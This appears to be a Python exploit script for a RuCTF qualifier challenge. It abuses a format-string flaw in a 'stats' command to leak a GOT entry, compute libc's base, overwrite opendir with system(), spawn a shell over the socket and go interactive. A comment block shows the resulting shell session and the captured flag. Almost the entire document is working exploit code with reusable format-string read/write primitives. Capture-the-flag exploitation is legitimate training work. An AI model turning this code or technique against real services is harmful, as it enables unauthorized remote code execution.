#!/usr/bin/python

import socket
import struct
import telnetlib

debug = False

def recvBytes(s, n):
    rxbuff = ""
    while len(rxbuff) < n:
        b = s.recv(1)
        if len(b) == 0:
            break;
        rxbuff += b
    return rxbuff

def recvUntil(s, needle):
    rxbuff = ""
    while rxbuff.find(needle) == -1:
        b = s.recv(1)
        if len(b) == 0:
            break;
        rxbuff += b
    return rxbuff


def leerInt(s, addr, label):
    addr_str = struct.pack("I", addr)
    txbuff = "stats " + addr_str + "%9$.4s"
    if debug: print "SEND: ", repr(txbuff)
    s.sendall(txbuff)

    rxbuff = recvUntil(s, addr_str)
    rxbuff += recvUntil(s, addr_str)
    value_str = recvBytes(s, 4)
    rxbuff += value_str
    rxbuff += recvUntil(s, "> ")
    if debug: print "RECV: ", repr(rxbuff)

    if debug: print "value_str: ", repr(value_str)
    value = struct.unpack("I", value_str)[0]    
    if debug: print "0x%08x: 0x%08x ;%s" % (addr, value, label)
    return value



def writeInt(s, addr, value):
    addr_str = struct.pack("I", addr)

    if value == 0:
        txbuff = "stats %11$n   " + addr_str
    elif value == 1:
        txbuff = "stats  %11$n  " + addr_str
    elif value == 2:
        txbuff = "stats   %11$n " + addr_str
    elif value == 3:
        txbuff = "stats    %11$n" + addr_str
    elif value == 4:
        txbuff = "stats " + addr_str + "%9$n"
    else:
        txbuff = "stats " + addr_str + "%" + str(value-4) + "d%9$n"
    if debug: print "SEND: ", repr(txbuff)
    s.sendall(txbuff)

    rxbuff = recvUntil(s, "> ")
    if debug: print "RECV: ", repr(rxbuff)




def writeBytes(s, addr, bytes):
    for i in xrange(0, len(bytes)):
        writeInt(s, addr+i, ord(bytes[i]))


def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


# testing
TARGET = ("ubuntu32vm", 16711)
libc_opendir = 0x000b4260
libc_system = 0x0003f430
shellcode = "sh 1>&4 0<&4"

# live

live = 1

if live == 1:
    TARGET = ("vuln1.quals.ructf.org", 16711)
    libc_opendir = 0x000b2a60
    libc_system = 0x0003ea70
    shellcode = "sh 1>&4 0<&4"


def exploit(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(target)

    rxbuff = recvUntil(s, "> ")
    if debug: print "RECV: ", repr(rxbuff)

    print "set count to 0"
    writeInt(s, 0x0804C4E0, 0)

    print "write shellcode string"
    writeBytes(s, 0x0804C3E0, shellcode)

    print "find libc base"
    opendir = leerInt(s, 0x0804C3C8, ".got opendir")
    libc = opendir - libc_opendir

    print "overwrite opendir got entry with address of system() in libc"
    system = libc + libc_system
    print "Address of system(): 0x%08X" % system
    writeBytes(s, 0x0804C3C8, struct.pack("I", system))

    print "set count to 1"
    writeInt(s, 0x0804C4E0, 1)


    print "TRIGGERING EXPLOIT"
    rxbuff = "stats %d"
    if debug: print "SEND: ", rxbuff
    s.sendall(rxbuff)

    print "INTERACTIVE MODE:"
    interact(s)



exploit(TARGET)



"""

uname -a
Linux vuln1 3.13.5-1-ARCH #1 SMP PREEMPT Sun Feb 23 00:25:24 CET 2014 x86_64 GNU/Linux

cat /proc/version
Linux version 3.13.5-1-ARCH (nobody@var-lib-archbuild-extra-x86_64-thomas) (gcc version 4.8.2 20140206 (prerelease) (GCC) ) #1 SMP PREEMPT Sun Feb 23 00:25:24 CET 2014


ls -alF
total 32
dr-x------ 4 aggregator aggregator  4096 Mar  8 16:43 ./
dr-xr-xr-x 5 root       root        4096 Mar  8 19:26 ../
-r-x------ 1 aggregator aggregator 14948 Mar  8 16:43 aggregator*
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 ctf/
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 sniperserver/

ls -alF ctf
total 24
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 ./
dr-x------ 4 aggregator aggregator  4096 Mar  8 16:43 ../
-r-------- 1 aggregator aggregator 14103 Mar  8 16:43 Real.ngLog.2012.07.42.42.42.24.7777.log

cat ctf/Real.ngLog.2012.07.42.42.42.24.7777.log | grep RUCTF_
0.59    player  Connect RUCTF_5b75086a  0   False

"""
